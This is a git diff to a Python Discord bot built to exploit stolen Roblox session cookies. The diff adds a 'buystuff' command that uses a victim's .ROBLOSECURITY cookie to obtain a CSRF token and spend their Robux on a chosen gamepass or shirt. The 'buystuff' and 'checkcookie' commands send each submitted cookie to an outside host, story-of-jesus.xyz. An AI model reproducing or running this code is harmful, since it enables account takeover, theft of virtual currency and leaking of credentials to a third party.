@@ -1,10 +1,10 @@
-import discord, requests, json
+import discord, requests, json, re
 from discord.ext import commands
 from bs4 import BeautifulSoup
 
 
 
-token = "TOKENHERE"
+token = "bottokenuwu"
 yourprefix = "!" ## enter the prefix of your choice by replacing the ! 
 dualhookchannelid = YOURCHANNELID ## e.g 905536418934427096
 
@@ -15,7 +15,7 @@ async def bancookie(ctx, cookie=None):
     req1 = requests.Session()
     
     if cookie == None:
-        await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '.bancookie mycookie'") ## let the user know they aint provided cookie
+        await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!bancookie mycookie'") ## let the user know they aint provided cookie
         return ## break command
     
     req1.cookies['.ROBLOSECURITY'] = cookie
@@ -49,12 +49,87 @@ async def bancookie(ctx, cookie=None):
         await ctx.reply("Uh oh request failed, invalid image?")
         return 
 
+@bot.command()
+async def buystuff(ctx, cookie=None):
+    if cookie == None:
+        await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!buystuff mycookie'") ## let the user know they aint provided cookie
+        return ## break command
+    
+    
+    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}')
+    if r.json()["status"] == "failed": 
+        await ctx.message.reply("Hmm. This Cookie Seems To Be Expired/Invalid.")
+        ## check if cookie invalid if not continue cmd
+        return
+
+    def check(msg):
+        return msg.author.id == ctx.author.id and msg.channel.id == ctx.channel.id
+        
+
+    await ctx.reply("Please Type Your Asset ID")
+
+    assetid1 = await bot.wait_for('message', check = check)
+    assetid = assetid1.content
+
+
+    await ctx.reply("Gamepass Or Shirt")
+
+    type1 = await bot.wait_for('message', check = check)
+    type = type1.content.lower()
+
+    auth_response = requests.post("https://auth.roblox.com/v1/logout", headers = {"cookie": f".ROBLOSECURITY={cookie}"})
+    token = None
+
+    if auth_response.status_code == 403:
+        if "x-csrf-token" in auth_response.headers:
+            token = auth_response.headers["x-csrf-token"]
+            ## get dat sexy csrf token
+    
+    if "gamepass" in type:
+        detail_res = requests.get(f"https://www.roblox.com/game-pass/{assetid}")
+        ## Request to get gamepass info
+    elif "shirt" in type:
+        detail_res = requests.get(f"https://www.roblox.com/catalog/{assetid}")
+        ## Request to get shirt info 
+    else:
+        await type1.reply("Urmm What?")
+        return
+        ## big confusion, user entered invalid type
+
+
+    ##
+    ## Creds To: https://devforum.roblox.com/t/what-is-the-api-endpoint-for-buying-items-in-the-catalog/569144/7 This Post For Saving Me Time Cuz Yeah
+    ##
+   
+    text = detail_res.text
+
+    productId = int(re.search("data-product-id=\"(\d+)\"", text).group(1))
+    expectedPrice = int(re.search("data-expected-price=\"(\d+)\"", text).group(1))
+    expectedSellerId = int(re.search("data-expected-seller-id=\"(\d+)\"", text).group(1))
+
+    headers = {
+        "cookie": f".ROBLOSECURITY={cookie}",
+        "x-csrf-token": token
+    }
+
+    payload = {
+        "expectedSellerId": expectedSellerId,
+        "expectedCurrency": 1,
+        "expectedPrice": expectedPrice
+    }
+
+    buyres = requests.post(f"https://economy.roblox.com/v1/purchases/products/{productId}", headers = headers, data = payload)
+    if buyres.status_code == 200:
+        await ctx.reply(f"Successfully Brought Gamepass Worth {expectedPrice} Robux")
+    else:
+        print(buyres.status_code)
+        await ctx.reply("Unexpected error in baggage area")
 
 @bot.command()
 async def checkcookie(ctx, cookie=None):  ## By default make Cookie = To None, so that u can detect wether or not user has entered a cookie
     
     if cookie == None:
-        await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '.checkcookie mycookie'") ## let the user know they aint provided cookie
+        await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!checkcookie mycookie'") ## let the user know they aint provided cookie
         return ## break command
 
     r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}') ## Send get request to my api to get info about cookie in json
